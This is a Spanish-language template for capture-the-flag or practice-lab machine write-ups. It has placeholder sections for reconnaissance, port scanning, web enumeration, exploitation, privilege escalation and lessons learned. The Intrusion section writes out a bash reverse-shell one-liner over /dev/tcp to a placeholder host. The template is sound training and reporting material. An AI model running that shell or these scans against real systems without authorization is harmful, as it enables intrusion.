
---
# Writeup Template: Maquina `[Nombre_Máquina]`

- Tags: `[Etiqueta1]` `[Etiqueta2]` `[Etiqueta3]`
- Dificultad: `[Baja/Media/Alta/Insane]`
- Plataforma: `[HTB/VulnHub/TryHackMe/etc]`

---
## Enlace al laboratorio
`[Enlace_Descarga_o_Acceso]`

## Configuración del Entorno
```bash
# Comandos para desplegar el laboratorio
[comando_descompresion] [archivo_laboratorio]
[comando_despliegue] [configuracion]
```

---

## Fase de Reconocimiento
### Identificación del Target
```bash
ping -c 1 [IP_TARGET]
```

### Determinacion del SO
```bash
wichSystem.py [IP_TARGET]
# TTL: [Valor] -> [Sistema_Operativo]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada
escanerTCP.py -t [IP_TARGET] -p [Rango_Puertos]

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn [IP_TARGET] -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
```bash
nmap -sCV -p[Puertos_Abiertos] [IP_TARGET] -oN targeted
```

**Servicios identificados:**
1. `[Puerto]/[Protocolo]`: [Servicio] ([Versión])
2. `[Puerto]/[Protocolo]`: [Servicio] ([Versión])
---

## Enumeracion de [Servicio_Principal]
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://[IP_TARGET]
```

```bash
nmap --script http-enum -p [PORT] [IP_TARGET]
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://[IP_TARGET]/[Ruta] -w [Diccionario] -t [Hilos] [Opciones_Adicionales]
```

**Hallazgos Relevantes:**
- `[Ruta_Importante]`: [Descripción]
- `[Ruta_Importante]`: [Descripción]

- **Hallazgos**:
```bash
/admin (Status: 200) [Size: 1534]
/backup (Status: 301) [Size: 315]
```

### Credenciales Encontradas
- Usuario: `[Usuario]`
- Contraseña: `[Contraseña]`

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
[Descripción breve del método de explotación]

### Ejecucion del Ataque
```bash
# Comandos para explotación
[comando_explotacion]
```

### Intrusion
```bash
# Reverse shell o acceso inicial
bash -c 'exec bash -i &>/dev/tcp/IP_TARGE/PORT <&1'
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
id
sudo -l
find / -perm -4000 2>/dev/null
```

**Hallazgos Clave:**
- Binario con privilegios: `[Binario]`
- Credenciales de usuario: `[Usuario]:[Contraseña]`

### Explotacion de Privilegios
```bash
# Comando para escalar al usuario: ( root )
[comando_escalada]
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
whoami
cat /root/proof.txt
```

---

## Lecciones Aprendidas
1. [Lección 1]
2. [Lección 2]
3. [Lección 3]

## Recomendaciones de Seguridad
- [Recomendación 1]
- [Recomendación 2]
- [Recomendación 3]

```
## Instrucciones de Uso:
1. Reemplazar los contenidos entre `[corchetes]` con la información específica de la máquina
2. Ajustar las secciones según las características del objetivo
3. Eliminar secciones no utilizadas
4. Agregar capturas de pantalla o outputs importantes donde sea necesario
5. Personalizar las lecciones aprendidas y recomendaciones
  ```

Este template incluye todas las secciones esenciales para un writeup completo y sigue el formato que yo uso para mis reportes, manteniendo la estructura de código, hallazgos y fases de ataque organizadas segun mi metodologia.